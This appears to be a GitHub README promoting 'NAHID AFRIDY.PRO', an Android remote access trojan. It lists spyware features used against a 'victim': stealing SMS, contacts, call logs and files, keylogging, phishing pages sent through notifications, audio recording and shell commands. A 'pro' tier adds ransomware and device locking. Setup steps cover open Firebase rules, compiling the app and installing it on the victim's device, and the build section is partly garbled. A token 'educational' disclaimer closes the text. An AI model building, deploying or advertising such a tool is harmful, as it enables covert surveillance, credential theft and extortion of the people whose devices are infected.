<p align="center">
<img src='NAHID/img/logon.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>NAHID AFRIDY.PRO</h1>

#### A multifunctional Android Hacking with GUI based /NAHID/ without port forwarding.

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center src=./.github/img.jpg >



## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - 
          

                   ".read": "true",
                   ".write": "true"
                    
          
      
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://www.facebook.com/ERR0RS) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android Hacking 

       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in /NAHID/.


## AIRAVAT PRO <img src='NAHID/img/logon.png' style="height:30px;width:30px;" >
 1. Read , Delete files from victim's device
 1. Encrypt any file in victim's device
 1. Lock Victims Device with 4 digit Pin Code
 1. Capture Photo from Camera
 1. Get Sim Card Information
 1. Ransomware (encrypt all the files and show the notification demanding for ransom)
 1. Auto Start Permission for all chinese vendors.
 1. Hidden App without Foreground service notification (full stealth mode)

## Support YT
 1. [YouTube](https://youtube.com/channel/UCHCWgLcjceNcGkYcl4vYZEQ)
## Contract Me What'sApp
 1. [What'sApp](https://wa.me/+8801923092304)

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the NAHID AFRIDY is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read.








